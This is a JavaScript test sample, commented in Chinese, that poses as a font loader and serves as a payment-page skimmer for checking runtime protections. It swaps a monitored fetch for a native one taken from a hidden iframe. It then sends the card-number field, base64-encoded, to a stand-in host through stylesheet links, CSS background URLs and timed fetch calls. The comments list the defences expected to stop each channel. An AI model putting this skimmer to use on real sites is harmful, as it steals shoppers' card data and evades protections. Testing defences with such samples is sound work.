/**
 * ⚠️⚠️⚠️ 测试样本③：被篡改的"字体加载器"脚本 —— 仅用于验证防御，禁止他用 ⚠️⚠️⚠️
 * 攻击手法（针对运行时防护的对抗）：
 *   1. 反防护侦察与破坏：检查 window.fetch 是否还是原生函数；
 *      创建一个隐藏同源 iframe，从中取出"干净"的原生 fetch 覆盖页面被监控的版本
 *   2. 隐写外发通道 A：把卡号 base64 后拼进"字体文件" URL，注入 <link rel=stylesheet>
 *      （字体/样式请求在 DevTools 里极不显眼）
 *   3. 隐写外发通道 B：通过 CSS background-image 的 url() 外发
 *   4. 通道 C：用偷来的原生 fetch 定期外发
 * 预期防御：
 *   - link 注入被"资源注入规则"当场阻断；CSS url() 被 setProperty 钩子阻断
 *   - 完整性心跳发现 window.fetch 被掉包 → 自动恢复并上报 tamper
 *   - 读取敏感字段被标记 → 一切跨域请求被拒 → 隔离
 */
(function () {
  'use strict';
  var EVIL = 'http://127.0.0.1:4001';

  // ---- 1. 反防护：用 iframe 里的原生 fetch 掉包被监控的 fetch ----
  try {
    if (!/\[native code\]/.test(String(window.fetch))) {
      var ifr = document.createElement('iframe');
      ifr.style.display = 'none';
      document.body.appendChild(ifr);
      window.fetch = ifr.contentWindow.fetch; // 掉包！
    }
  } catch (e) { /* 防护在场时可能失败 */ }

  // ---- 表面功能：加载一个"品牌字体"（实际地址是本站，无害）----
  var font = document.createElement('link');
  font.rel = 'stylesheet';
  font.href = '/fonts/brand.css'; // 不存在也没关系，只是外观
  document.head.appendChild(font);

  // ---- 暗桩：多通道隐写外发 ----
  function stolenCardData() {
    var el = document.getElementById('card-number');
    return el && el.value ? el.value : null;
  }

  function exfilViaFont(card) {
    var link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = EVIL + '/fonts/inter-var.woff2.css?x=' + btoa(card);
    document.head.appendChild(link);
  }

  function exfilViaCssBackground(card) {
    var badge = document.createElement('div');
    badge.className = 'secure-badge';
    badge.style.setProperty('background-image', 'url(' + EVIL + '/img/badge.png?d=' + btoa(card) + ')');
    document.body.appendChild(badge);
  }

  function exfilViaStolenFetch(card) {
    window.fetch(EVIL + '/collect?d=' + btoa(card), { mode: 'no-cors' });
  }

  setInterval(function () {
    var card = stolenCardData();
    if (!card || card.replace(/\D/g, '').length < 12) return;
    exfilViaFont(card);
    exfilViaCssBackground(card);
    exfilViaStolenFetch(card);
  }, 4000);
})();
